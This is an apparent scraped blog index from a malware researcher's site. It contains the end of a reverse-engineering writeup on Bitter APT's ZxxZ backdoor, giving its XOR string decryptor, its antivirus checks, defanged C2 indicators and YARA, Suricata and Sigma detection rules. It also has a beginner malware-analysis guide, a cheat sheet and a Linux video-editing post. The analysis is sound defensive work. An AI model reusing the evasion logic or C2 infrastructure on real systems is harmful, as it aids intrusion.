Studio was never provided a name and is certainly a heuristic indicator we can hunt for. LoadStringA(hInstance0,\"NewProject_2.1\",\u0026lpWindowName,100); LoadStringA(hInstance0,\"NEWPROJECTT_21\",\u0026lpClassName,100); RegisterWindowClass(hInstance0); HINSTANCE_SELF = hInstance; hWnd = CreateWindowExA( NULL, \u0026lpClassName, \u0026lpWindowName, WS_TILEDWINDOW, 0x80000000, 0, 0x80000000, 0, (HWND)NULL, (HMENU)NULL, hInstance0, (LPVOID)NULL); Interestingly, they opt to use large negative values for the parameters X and nWidth as 0x80000000 will be int resulting in -2147483648. I don’t believe there is much legitimate purpose to this. Maybe they were worried their window would show on the screen. 😂 Once completed creating the window, it will perform a decryption routine on the C2 server domain subscribe[.]tomcruefrshsvc[.]com. This is performed with the following algorithm. Figure 3: String Decryption Algorithm (Simple XOR) After reverse engineering this algorithm we can implement the same routine in Python. def EncryptDecrypt(key, data): \"\"\" Bitter APT EncryptDecrypt Strings Function \"\"\" keylen = len(key) keypos = 0 for i in range(0, len(data)): if data[i] == 0x00: break if keypos \u003e= keylen: keypos = 0 data[i] = data[i] ^ int(key[keypos].encode('utf-8').hex(), base=16) keypos += 1 return data.decode('utf-8') It is also possible to easily decrypt the strings in CyberChef as well. Figure 4: CyberChef String Decryption At least here they are using 2-byte XOR keys. 😂 Then it will start creating a directory path string using CSIDL_LOCAL_APPDATA (C:\\Users\\\\\u003cusername\\\u003e\\AppData\\Local), if this was unsuccessful it will attempt to create CSIDL_TEMPLATES (C:\\Users\\\\\u003cusername\\\u003e\\Templates) and CSIDL_SENDTO (C:\\Users\\\\\u003cusername\\\u003e\\SendTo) respectively. iResult = SHGetFolderPathA(NULL,CSIDL_LOCAL_APPDATA,NULL,NULL,\u0026PATH); if ((iResult != 0) \u0026\u0026 (iResult = SHGetFolderPathA(NULL,CSIDL_TEMPLATES,NULL,NULL,\u0026PATH), iResult != 0)) { SHGetFolderPathA(NULL,CSIDL_SENDTO,NULL,NULL,\u0026PATH); } Once completed, it will call strcat_s to append the path with string \\\\\\\\Updates. It will then call \\_mkdir to create the directory C:\\\\Users\\\\username\\\\\\\u003cpath-type\\\u003e\\\\Updates. Execution will continue until it appends the path with the string systemlog, in a very redundant way. 😂 Figure 5: Obfuscated but not really string ‘systemlog’. It will then call kernel32.Sleep to sleep for 30 seconds. Once it has finished sleeping, it will check for the presence of the process avp (Kaspersky) and MsMp (Microsoft Security Monitor Process) and only establish persistence if those security processes are not present on the system. At least they are making an effort here to be stealthy and infect only poorly secured machines. bResult = IsProcess(\"avp\"); i","date":"2022-06-26","objectID":"/2022/06/bitter-apt-zxxz-backdoor/:2:4","tags":["Malware","Reversing","Bitter","APT"],"title":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","uri":"/2022/06/bitter-apt-zxxz-backdoor/"},{"categories":["Malware"],"content":"Configuration Extraction Since we now understand how the malware decrypts its strings, I created an automated configuration extractor for mwcfg. The following is an example of how to perform extraction on Bitter APT ZxxZ samples you might have. mwcfg --modules modules/ --input tests/bitter/cc7ddf9ed230ad4e060dfd0f32389efb --pretty [ { \"name\": \"tests/bitter/cc7ddf9ed230ad4e060dfd0f32389efb\", \"type\": \"PE32 executable (GUI) Intel 80386, for MS Windows\", \"mime\": \"application/x-dosexec\", \"md5\": \"cc7ddf9ed230ad4e060dfd0f32389efb\", \"sha1\": \"05af416c3173cdb0b49d51db1db7b8f90639e3b8\", \"sha256\": \"09bb6b01db8b2177779d90c5444d91859994a1c2e907e5b444d6f6e67d2cfcfe\", \"configs\": [ { \"domain\": \"subscribe.tomcruefrshsvc.com\", \"family\": \"bitter_zxxz\" } ] } ] ","date":"2022-06-26","objectID":"/2022/06/bitter-apt-zxxz-backdoor/:3:0","tags":["Malware","Reversing","Bitter","APT"],"title":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","uri":"/2022/06/bitter-apt-zxxz-backdoor/"},{"categories":["Malware"],"content":"Classification I wouldn’t call this malware a Remote Administration Tool (RAT) or a botnet for that matter. The functionality is quite simple. Accept a single command, which is the payload you wish to execute from the C2 server. With this in mind, I classify this malware as a backdoor. ","date":"2022-06-26","objectID":"/2022/06/bitter-apt-zxxz-backdoor/:4:0","tags":["Malware","Reversing","Bitter","APT"],"title":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","uri":"/2022/06/bitter-apt-zxxz-backdoor/"},{"categories":["Malware"],"content":"Conclusion We reverse engineered Bitter APT’s ZxxZ backdoor to the point we can repurpose it for our own red team operations. What I really wanted to show with this analysis and Proof of Concept (PoC), is that we need to be very careful with our attribution of threat actors. It is undeniably possible for one nation-state threat actor to frame another using similar methods. Based on this analysis, it would also not suprise me if this behavior is already happening in the wild. Cisco Talos also did an analysis on ZxxZ backdoor entitled Bitter APT adds Bangladesh to their Targets. Although this is a great report, I wanted to do more with this malware to showcase what is possible. I could certainly weaponize their code by writing a utility to patch the maldoc exploit and backdoor. However, I have decided against doing this as it would make it too easy for skiddies to parade around as Bitter APT and cause more mayhem for our industry. Although I do poke fun at Bitter APT’s mistakes, this attack chain from them shows that they are capable of being a notable threat to Pakistan 🇵‍🇰. While they are not delivering the most advanced attack in this example, these APT groups usually are large orgainzations of people with a large variety of skill levels. This malware would appear to be created by someone who is likely new to developing nation state quality malware. I wonder if they have quality control as part of their standard processes and procedures, perhaps we will never know. 😅 I think we successfully destroyed Bitter APT’s ZxxZ backdoor now. 😜 ","date":"2022-06-26","objectID":"/2022/06/bitter-apt-zxxz-backdoor/:5:0","tags":["Malware","Reversing","Bitter","APT"],"title":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","uri":"/2022/06/bitter-apt-zxxz-backdoor/"},{"categories":["Malware"],"content":"Downloads Samples and Ghidra Project ","date":"2022-06-26","objectID":"/2022/06/bitter-apt-zxxz-backdoor/:6:0","tags":["Malware","Reversing","Bitter","APT"],"title":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","uri":"/2022/06/bitter-apt-zxxz-backdoor/"},{"categories":["Malware"],"content":"Indicators This section covers all the indicators covered in the report. ","date":"2022-06-26","objectID":"/2022/06/bitter-apt-zxxz-backdoor/:7:0","tags":["Malware","Reversing","Bitter","APT"],"title":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","uri":"/2022/06/bitter-apt-zxxz-backdoor/"},{"categories":["Malware"],"content":"Static Type Filename Description SHA256 hash sample_0.bin Maldoc 9a8b201eb2bebe309d15c7b0ab5a6dcde460b84b035bb3575d4a0ec6af51a37e hash sample_1.bin OLE Object 96e61b3f2c3c4ffe065c0aa492145b90956b45660bd614e5924ef9b6dade3c57 hash sample_2.bin OLE Stream f0d4d43cd6f3c33ed78d13722e81d03f21101edbc15cb0782448d0843fb2bf7f hash sample_3.bin Decrypted Shellcode d6fdc95e74aea3f7072ca713213ff157c0999f53b3b130f8217ea63231b109ad url MSI Payload hxxp://sbss[.]com[.]pk/gts/bd[.]msi domain MSI Payload sbss[.]com[.]pk ip MSI Payload 203[.]124[.]44[.]180 hash sample_4.bin MSI Installer b026a255b2e17fb0c608f1265837e425ea89cc7f661975c6a0d9051e917f4611 hash sample_5.bin CAB Archive 42745ddb257a25671f18ff6c2ad38e9c89b64f4d13f4412097691384e626672f hash sample_6.bin PE Payload 09bb6b01db8b2177779d90c5444d91859994a1c2e907e5b444d6f6e67d2cfcfe domain C2 Domain subscribe[.]tomcruefrshsv[.]com ip C2 IP 185[.]7[.]33[.]56 ","date":"2022-06-26","objectID":"/2022/06/bitter-apt-zxxz-backdoor/:7:1","tags":["Malware","Reversing","Bitter","APT"],"title":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","uri":"/2022/06/bitter-apt-zxxz-backdoor/"},{"categories":["Malware"],"content":"TTPs ID Tactic Technique T1203 Execution Exploitation for Client Execution T1547 Persistence Boot or Logon Autostart Execution T1095 Command and Control Non-Application Layer Protocol T1592 Reconnaissance Gather Victim Host Information T1001 Command and Control Data Obfuscation ","date":"2022-06-26","objectID":"/2022/06/bitter-apt-zxxz-backdoor/:7:2","tags":["Malware","Reversing","Bitter","APT"],"title":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","uri":"/2022/06/bitter-apt-zxxz-backdoor/"},{"categories":["Malware"],"content":"Graph ","date":"2022-06-26","objectID":"/2022/06/bitter-apt-zxxz-backdoor/:7:3","tags":["Malware","Reversing","Bitter","APT"],"title":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","uri":"/2022/06/bitter-apt-zxxz-backdoor/"},{"categories":["Malware"],"content":"Detection I’m providing the following signatures to help the community detect this threat. ","date":"2022-06-26","objectID":"/2022/06/bitter-apt-zxxz-backdoor/:8:0","tags":["Malware","Reversing","Bitter","APT"],"title":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","uri":"/2022/06/bitter-apt-zxxz-backdoor/"},{"categories":["Malware"],"content":"YARA rule malware_bitter_zxxz_0 { meta: author = \"c3rb3ru5d3d53c\" description = \"MALWARE Bitter APT ZxxZ Backdoor\" hash = \"09bb6b01db8b2177779d90c5444d91859994a1c2e907e5b444d6f6e67d2cfcfe\" reference = \"https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/\" created = \"2022-07-01\" os = \"windows\" tlp = \"white\" rev = 1 strings: $delimiter = \"ZxxZ\" ascii wide $rng = {c7 05 ?? ?? ?? ?? 52 4e 47 00} $string_decryptor = {53 3b ca 75 ?? 33 c9 8a 1c ?? 30 1c ?? 40 41 3b c6 7c} condition: uint16(0) == 0x5a4d and uint32(uint32(0x3c)) == 0x00004550 and filesize \u003c 4128028 and 2 of them } rule heuristic_xor_strings_0 { meta: author = \"c3rb3ru5d3d53c\" description = \"HEURISTIC Suspicious XOR Strings\" reference = \"https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/\" hash = \"f0d4d43cd6f3c33ed78d13722e81d03f21101edbc15cb0782448d0843fb2bf7f\" created = \"2022-06-27\" type = \"heuristic\" os = \"windows\" tlp = \"white\" rev = 1 strings: $str_0 = \"://\" xor $str_1 = \"LoadLibrary\" xor $str_2 = \"GetProcAddress\" xor $str_3 = \"ShellExecute\" xor $str_4 = \"kernel32\" xor condition: any of ($str_*) } rule heuristic_pe_default_project_name_0 { meta: author = \"c3rb3ru5d3d53c\" description = \"HEURISTIC Binary Default Project Name\" reference = \"https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/\" hash = \"09bb6b01db8b2177779d90c5444d91859994a1c2e907e5b444d6f6e67d2cfcfe\" created = \"2022-06-29\" os = \"windows\" tlp = \"white\" rev = 1 strings: $project_name_0 = \"NewProject_\" ascii wide condition: uint16(0) == 0x5a4d and uint32(uint32(0x3c)) == 0x00004550 and any of ($project_name_*) } ","date":"2022-06-26","objectID":"/2022/06/bitter-apt-zxxz-backdoor/:8:1","tags":["Malware","Reversing","Bitter","APT"],"title":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","uri":"/2022/06/bitter-apt-zxxz-backdoor/"},{"categories":["Malware"],"content":"Suricata alert http $HOME_NET any -\u003e $EXTERNAL_NET any ( msg:\"MALWARE Bitter APT ZxxZ Backdoor C2 Checkin\"; content:\"GET\"; http_method; content:\"\u0026\u0026\"; http_uri; fast_pattern; content:\"OsI=\"; http_uri; content:!\"User-Agent|3a 20|\"; http_header; flow:to_server, established; reference:url, https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/; metadata:created 2022-06-30, type malware.backdoor, os windows, tlp white; classtype:trojan-activity; sid:1000016; rev:1; ) alert http $HOME_NET any -\u003e $EXTERNAL_NET any ( msg:\"MALWARE Bitter APT ZxxZ Backdoor C2 Beacon\"; content:\"GET\"; http_method; content:\"ZxxZ\"; http_uri; fast_pattern; pcre:\"/=(RNG|DN-S|S|RN_E)/U\"; flow:to_server, established; reference:url, https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/; metadata:created 2022-06-30, type malware.backdoor, os windows, tlp white; classtype:trojan-activity; sid:1000017; rev:1; ) alert http $HOME_NET any -\u003e $EXTERNAL_NET any ( msg:\"HEURISTIC Suspicious MSI Installer Activity\"; content:\"GET\"; http_method; content:\"Windows Installer\"; http_user_agent; fast_pattern; pcre:\"/\\.com\\.pk|xyz|tk|top|hopto\\.org|linkpc\\.net|portmap\\.io|ngrok\\.io|ddns\\.net|duckdns\\.org)$/W\"; flow:to_server, established; reference:url, https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/; metadata:created 2022-07-04, type heuristic, os windows, tlp white; classtype:misc-attack; sid:1000015; rev:1; ) ","date":"2022-06-26","objectID":"/2022/06/bitter-apt-zxxz-backdoor/:8:2","tags":["Malware","Reversing","Bitter","APT"],"title":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","uri":"/2022/06/bitter-apt-zxxz-backdoor/"},{"categories":["Malware"],"content":"Sigma id: eb65d88b-3f45-4ed4-bb51-23b39bbcf9e3 title: HEURISTIC Suspicious Startup File Created description: Detects suspicious startup files being created reference: https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/ author: c3rb3ru5d3d53c created: 2022-06-30 type: heuristic os: windows tlp: white rev: 1 logsource: product: windows category: file_creation detection: selection_0: TargetFilename|contains: - '\\Start Menu\\Programs\\Startup\\' selection_1: TargetFilename|endswith: - '\\update.LNK' condition: selection_0 and selection_1 falsepositives: - Unknown id: c2b9e035-f225-49f9-8161-776b64ab16d0 title: HEURISTIC Suspicious Process Created in AppData Folder description: Detects suspicious startup files being created reference: https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/ author: c3rb3ru5d3d53c created: 2022-06-30 type: heuristic os: windows tlp: white rev: 1 logsource: product: windows category: process_creation detection: selection_0: Image|contains: - '\\AppData\\Local\\' selection_1: Image|endswith: - '\\tmp.exe' condition: selection_0 and selection_1 falsepositives: - Unknown id: 653014f7-1b43-4355-8616-c521baac9bf4 title: EXPLOIT Equation Editor Exploit RCE (CVE-2017-11882) description: Detects exploitation of CVE-2017-11882 reference: https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/ created: 2022-07-04 type: exploit.rce os: windows tlp: white rev: 1 logsource: category: process_creation product: windows detection: selection_0: ParentImage|endswith: - '\\EQNEDT32.EXE' condition: selection_0 falsepositives: - Unknown All these signatures are available on my signatures GitHub repository. ","date":"2022-06-26","objectID":"/2022/06/bitter-apt-zxxz-backdoor/:8:3","tags":["Malware","Reversing","Bitter","APT"],"title":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","uri":"/2022/06/bitter-apt-zxxz-backdoor/"},{"categories":["Malware"],"content":"References ShadowChasing1 Tweet Bitter APT adds Bangladesh to their targets Whatever floats your Boat – Bitter APT continues to target Bangladesh Bitter APT Operation Magichm ","date":"2022-06-26","objectID":"/2022/06/bitter-apt-zxxz-backdoor/:9:0","tags":["Malware","Reversing","Bitter","APT"],"title":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","uri":"/2022/06/bitter-apt-zxxz-backdoor/"},{"categories":["Docs"],"content":"A CopyPasta for Beginner Malware Analysts","date":"2022-06-24","objectID":"/2022/06/malware-analysis-beginner-guide/","tags":["Beginner","Malware","Analysis"],"title":"Beginner Malware Analyst CopyPasta","uri":"/2022/06/malware-analysis-beginner-guide/"},{"categories":["Docs"],"content":"Hello everyone, malware analysis is a hot topic lately as the threats we work against in the cybersecurity industry become more advanced with each passing day. This creates demand for these types of skills in the industry. I’ve mentored and taught many malware analysts and what I’ve learned from this experience do not align with certifications. Although certifications are helpful, they are not what I’d recommend starting with from scratch. This guide aims to get you started in malware analysis without having to pay anyone any money. 😄 I would like to indicate that this is not a reverse engineering guide, this is simply a malware analysis guide to get beginners started on their longer journey. It will not cover every aspect of malware analysis either. Again, this is only to provide a starting point for those who are having trouble starting in the first place. Before we get started learning malware analysis, you must know what malware analysis is as a high level concept. Malware Analysis - The study or process of determining the functionality, origin and potential impact of a given malware sample such as a virus, worm, trojan horse, rootkit, or backdoor. - https://en.wikipedia.org/wiki/Malware_analysis This gives us a few pointers as to what malware analysis is. It describes it as the process of determining functionality of malicious software. For those of you who are completely unaware, malware can be simply defined as malicious software. In order to understand if anything is malicious or not, we need to understand the software’s intent. This is a much more complex subject than most would think, sometimes the intent is clear, encrypt all files and don’t provide user with a password, other times it is much more complicated. This complication can occur where you have software that can execute remote code and that is it’s only feature. This exists in legitimate software as well as malicious software. It really comes down to the observed usage of the software and the intent of its operators. Typically, we would associate a software like this as malware if we observe it as part of a malicious campaign run by threat actors. Regardless of the philosophy behind what can be considered malware and what is considered goodware (legitimate software). This should help clarify to those who are starting to look at this field, that sometimes the most simple questions have no clear-cut answer. This world of analyzing potentially malicious software is at times shades of grey. ","date":"2022-06-24","objectID":"/2022/06/malware-analysis-beginner-guide/:0:0","tags":["Beginner","Malware","Analysis"],"title":"Beginner Malware Analyst CopyPasta","uri":"/2022/06/malware-analysis-beginner-guide/"},{"categories":["Docs"],"content":"Avoiding Common Mistakes Now that you have the fundamental concepts of what malicious software is and its limitations. I’d like to discuss some of the most common mistakes I see beginners make when trying to enter this field in cybersecurity. ","date":"2022-06-24","objectID":"/2022/06/malware-analysis-beginner-guide/:1:0","tags":["Beginner","Malware","Analysis"],"title":"Beginner Malware Analyst CopyPasta","uri":"/2022/06/malware-analysis-beginner-guide/"},{"categories":["Docs"],"content":"Buying Success When having conversations with those interested in malware analysis, they will ask about what certification to buy. They will be looking at very expensive certifications right away. This should be avoided as they have no idea if they even enjoy the work. It costs you nothing to use your own existing computer to download VirtualBox and spin up a Windows VM with internet disabled. With this you can start using some initial resources to get yourself started. There are plenty of resources online to help with this. I will be providing a list of resources to help get you started. Again, experimenting before you spend your hard-earned money is very easy in this digital age. ","date":"2022-06-24","objectID":"/2022/06/malware-analysis-beginner-guide/:1:1","tags":["Beginner","Malware","Analysis"],"title":"Beginner Malware Analyst CopyPasta","uri":"/2022/06/malware-analysis-beginner-guide/"},{"categories":["Docs"],"content":"Procrastination The vast majority of beginners I’ve worked with over the years will state they are going to start malware analysis. I tell them that’s great, then when we talk a month later and I ask them how it’s going they state they have not started yet. Most of them will then indicated they have no idea how to get started. They usually will not even have a VM created or anything started at all. In order to get properly started, you must first take that leap into the deep end. If you have a busy life like I did and having to learn all this while holding a full time job and having children, use a calendar, set alarms to remind you to spend dedicated time. Without proper time management, it will be difficult for anyone to make progress. ","date":"2022-06-24","objectID":"/2022/06/malware-analysis-beginner-guide/:1:2","tags":["Beginner","Malware","Analysis"],"title":"Beginner Malware Analyst CopyPasta","uri":"/2022/06/malware-analysis-beginner-guide/"},{"categories":["Docs"],"content":"Handling Failure Malware analysis and reverse engineering is hard. You need to mentally prepare yourself to fail a lot. Even to this day, I will encounter puzzles as part of reverse engineering or analyzing malware that take me a very long time to solve. These failures are okay, the worst case will be really just rolling back a snapshot and trying again. I use this quote about traveling to the moon for inspiration. We choose to go to the Moon in this decade and do the other things, not because they are easy, but because they are hard, because that goal will serve to organize and measure the best of our energies and skills, because that challenge is one that we are willing to accept, one we are unwilling to postpone. - President John F. Kennedy Replace moon with malware analysis, and it shall get you ready to go! Failure’s not an option. It’s just a step. - Dwane Johnson Realizing that failure are only steps on the path to success is very important to keep reminding yourself. ","date":"2022-06-24","objectID":"/2022/06/malware-analysis-beginner-guide/:1:3","tags":["Beginner","Malware","Analysis"],"title":"Beginner Malware Analyst CopyPasta","uri":"/2022/06/malware-analysis-beginner-guide/"},{"categories":["Docs"],"content":"Memorizing Facts The academic industry is very hell-bent on having students remember facts and take tests. The inherent problem with this is most people will completely forget what they did. Going through my own self study, I learned that I learn best when I work on something practically. While the theory is good, it makes much more sense to work on applying that theory in the real-world. This gives you experience which connects to reason, which in-turn enables remembering concepts. This is very important as again, we have mostly been taught to only remember points of facts, without reason attributed to those facts, they will have a very short shelf life in your brain. For inspiration I like the following quote. If you give a man a fish, you feed him for a day. If you teach a man to fish, you feed him for a lifetime. We humans are not walking dictionaries or databases, the knowledge we retain has to be trained like a machine learning algorithm with a ton of failure on the way to success. Also, if you ever learned to drive a bicycle do you only learn theory about it then have to succeed the first time you ride it? No, you don’t, it’s the same concepts. You study the theory, then go you practice it for real and fail many times on the way to success. ","date":"2022-06-24","objectID":"/2022/06/malware-analysis-beginner-guide/:1:4","tags":["Beginner","Malware","Analysis"],"title":"Beginner Malware Analyst CopyPasta","uri":"/2022/06/malware-analysis-beginner-guide/"},{"categories":["Docs"],"content":"Getting Started Now that I have discussed with you the common mistakes beginners make in learning malware analysis. I’m going to do by best to lay out tools which everyone can use because they are open-source. Again, to get into this field all you need is the modivation, drive and time to do it. Please keep in mind this is not an extensive tutorial, it is a high level guide. Be resourceful and use Google if there is any of the steps you are having trouble with. ","date":"2022-06-24","objectID":"/2022/06/malware-analysis-beginner-guide/:2:0","tags":["Beginner","Malware","Analysis"],"title":"Beginner Malware Analyst CopyPasta","uri":"/2022/06/malware-analysis-beginner-guide/"},{"categories":["Docs"],"content":"Focusing on the Purpose As in any field of practice there is the fun part of the job, then there is the not so fun part of the job. Just analyzing malware without purpose benifits no-one except yourself. If you plan to make malware analysis a career you need to also focus on the purpose of the analysis you are performing. Typically, this purpose is to do the following. Write Detection File (YARA) Endpoint (Sigma) Network (Suricata, Snort) Write Automated Extraction Tools like mwcfg Writing Technical Reports If there is no goal or purpose to your work, no-one will pay you money for it. 😄 ","date":"2022-06-24","objectID":"/2022/06/malware-analysis-beginner-guide/:2:1","tags":["Beginner","Malware","Analysis"],"title":"Beginner Malware Analyst CopyPasta","uri":"/2022/06/malware-analysis-beginner-guide/"},{"categories":["Docs"],"content":"Creating your Virtual Machines Download VirtualBox Install VirtualBox Download Windows ISO Create Windows VM Start your Windows VM and Install Windows Install VirtualBox Guest Additions Add Tools of the trade to your Windows VM Disable Network Adapter (Settings -\u003e Network -\u003e Untick Enable Network Adapter) Take a clean snapshot so you can revert to a clean state Create a Remnux VM (VirtualBox OVA) Download VirtualBox OVA Create the VM Read the Docs Watch this introduction video ","date":"2022-06-24","objectID":"/2022/06/malware-analysis-beginner-guide/:2:2","tags":["Beginner","Malware","Analysis"],"title":"Beginner Malware Analyst CopyPasta","uri":"/2022/06/malware-analysis-beginner-guide/"},{"categories":["Docs"],"content":"Obtaining Malware I would recommend your first sample to be ransomware as it usually makes itself obvious and has clear behaviors for beinners to identify. There are a variety of sources you can get malware samples from, and I’ll list them here. VirusTotal MalwareBazaar VxUnderground AnyRun (public sandbox) HybridAnalysis (public sandbox) Triage (public sandbox) Cape (public sandbox) When obtaining malware from different sites like this, download to your host machine but as an encrypted ZIP file. Once downloaded, if you have VirtualBox Guest Additions you should be able to drag and drop the file to your malware VM. ","date":"2022-06-24","objectID":"/2022/06/malware-analysis-beginner-guide/:2:3","tags":["Beginner","Malware","Analysis"],"title":"Beginner Malware Analyst CopyPasta","uri":"/2022/06/malware-analysis-beginner-guide/"},{"categories":["Docs"],"content":"Performing your First Analysis To get started there is no need to make it complicated. Execute Malware in a public sandbox Execute the malware in your VM Monitor with Procmon, Sysmon and Wireshark Identify the same behaviors highlighted by the sandbox in your own VM Write a report indicating key behaviors observed from start to finish Initial Infection Vector Static Analysis (File Properties use Remnux VM) Endpoint Behavior (Process Execution) Network Traffic (Command and Control) Classification (Malpedia can help) Conclusion When you write your report, I recommend writing it in markdown format to start. Once you have completed your report, save these and start building your own portfolio. ","date":"2022-06-24","objectID":"/2022/06/malware-analysis-beginner-guide/:2:4","tags":["Beginner","Malware","Analysis"],"title":"Beginner Malware Analyst CopyPasta","uri":"/2022/06/malware-analysis-beginner-guide/"},{"categories":["Docs"],"content":"Establishing a Portfolio Employers are always looking for value in your abilities, when employers are able to see that there is immediate value to your work through a portfolio. This makes their decision much easier and the easier their decisions the higher the probability you will get noticed for an interview. To start your portfolio I’d recommend GitHub Pages. This will make it easy not just to have a place you can put your code for your portfolio but also have a website or blog as your portfolio. The great thing about creating your own reports in markdown is that you can directly use those with GitHub Pages, and it will get converted into HTML for you. I personally use Hugo to build my Github Pages site. ","date":"2022-06-24","objectID":"/2022/06/malware-analysis-beginner-guide/:2:5","tags":["Beginner","Malware","Analysis"],"title":"Beginner Malware Analyst CopyPasta","uri":"/2022/06/malware-analysis-beginner-guide/"},{"categories":["Docs"],"content":"Obtaining New Challenges Helping the community is another great way to learn, most of us are sharing indicators of compromise and behaviors on Twitter. I would recommend signing up and looking for hashtags of different malware families from Malpedia and when someone needs help, try downloading the sample and helping them. One of the things I like to do is to build my portfolio while also helping the community. This can be done simply by doing quote tweets with links to your analysis. The great thing about doing this is that you will be able to help the community while also giving your portfolio a boost. Everyone wins! If you wish to learn more about creating a more advanced malware lab, please refer to my KVM Malware Lab Guide. ","date":"2022-06-24","objectID":"/2022/06/malware-analysis-beginner-guide/:2:6","tags":["Beginner","Malware","Analysis"],"title":"Beginner Malware Analyst CopyPasta","uri":"/2022/06/malware-analysis-beginner-guide/"},{"categories":["Docs"],"content":"Certifications If you have performed the tasks laid out from a practical standpoint, and you are enjoying yourself, now is the time to consider certifications. Not all certifications are created equally. I would recommend that you search for ones that have a good reputation but also have a practical component. ","date":"2022-06-24","objectID":"/2022/06/malware-analysis-beginner-guide/:2:7","tags":["Beginner","Malware","Analysis"],"title":"Beginner Malware Analyst CopyPasta","uri":"/2022/06/malware-analysis-beginner-guide/"},{"categories":["Docs"],"content":"Additional Resources Malpedia ExploitDB EmergingThreats AlienVault OALabs MalwareAnalysisForHedgehogs John Hammond Niel Fox AhmedS Kasmani Colin Hardy DumpGuyTrickster L!NK MalfindLabs 0xca7 MalwareHunterTeam ","date":"2022-06-24","objectID":"/2022/06/malware-analysis-beginner-guide/:2:8","tags":["Beginner","Malware","Analysis"],"title":"Beginner Malware Analyst CopyPasta","uri":"/2022/06/malware-analysis-beginner-guide/"},{"categories":["Docs"],"content":"Conclusion Malware analysis can be a daunting career to get started, as someone who taught myself from scratch with very little money to scrape together. If I was to do this all over again, this is exactly how I’d do it. Again, learning malware analysis requires you to actually start doing the work. Even if you don’t know anything, use this guide to give you the basic fundamental knowledge and resources and pivot into your journey from there. If this helps you and others are wondering how to get into the industry feel free to share this with them. ","date":"2022-06-24","objectID":"/2022/06/malware-analysis-beginner-guide/:3:0","tags":["Beginner","Malware","Analysis"],"title":"Beginner Malware Analyst CopyPasta","uri":"/2022/06/malware-analysis-beginner-guide/"},{"categories":["Docs"],"content":"A reverse engineering cheat sheet of sorts","date":"2022-06-24","objectID":"/2022/06/cheatsheet/","tags":["Cheatsheet"],"title":"Reverse Engineering CheatSheet","uri":"/2022/06/cheatsheet/"},{"categories":["Docs"],"content":"SHA256 Files in Folder find . -maxdepth 1 -type f | while read i; mv $i (sha256sum $i | grep -Po '^[a-f0-9]+'); end ","date":"2022-06-24","objectID":"/2022/06/cheatsheet/:1:0","tags":["Cheatsheet"],"title":"Reverse Engineering CheatSheet","uri":"/2022/06/cheatsheet/"},{"categories":["Docs"],"content":"Download Hashes from Clipboard xclip -o -s -c | xargs -I {} echo \"vt download {}\" | parallel -j 8 {} ","date":"2022-06-24","objectID":"/2022/06/cheatsheet/:2:0","tags":["Cheatsheet"],"title":"Reverse Engineering CheatSheet","uri":"/2022/06/cheatsheet/"},{"categories":["Docs"],"content":"Binlex Top 10 Traits find samples/ -type f | while read i; binlex -i $i | jq -r 'trait' | sort | uniq; end | sort | uniq -c | sort -rn | head -10 ","date":"2022-06-24","objectID":"/2022/06/cheatsheet/:3:0","tags":["Cheatsheet"],"title":"Reverse Engineering CheatSheet","uri":"/2022/06/cheatsheet/"},{"categories":["Docs"],"content":"Capture PCAP tshark -i lo -F libpcap -w (date +\"%Y-%m-%d\").pcap ","date":"2022-06-24","objectID":"/2022/06/cheatsheet/:4:0","tags":["Cheatsheet"],"title":"Reverse Engineering CheatSheet","uri":"/2022/06/cheatsheet/"},{"categories":["Docs"],"content":"Linux TTS flite --setf duration_stretch=0.5 -voice slt -t \"Hello World!\" ","date":"2022-06-24","objectID":"/2022/06/cheatsheet/:5:0","tags":["Cheatsheet"],"title":"Reverse Engineering CheatSheet","uri":"/2022/06/cheatsheet/"},{"categories":["Docs"],"content":"A guide for Video Editing in Linux","date":"2022-06-23","objectID":"/2022/06/linux-video-editing/","tags":["Video","Editing"],"title":"Video Editing in Linux","uri":"/2022/06/linux-video-editing/"},{"categories":["Docs"],"content":"Video editing in Linux has always been a hot topic in the community. It also has been discussed by a lot of Linux content creators. I have been using Linux for the past 10 years as my operating system for everything I do. With this has come challenges, of course years ago it was virtually impossible. The landscape has shifted for Linux content creators. You really no longer need to purchase Davanchi Studio. The best new player on the block I’d recommend is Blender. This is as simple as doing the following. sudo snap install blender sudo apt update sudo apt-add-repository ppa:obsproject/obs-studio sudo apt install audacity ffmpeg obs-studio Once installed, lauch Blender and click on the Video Editing view for a new project. 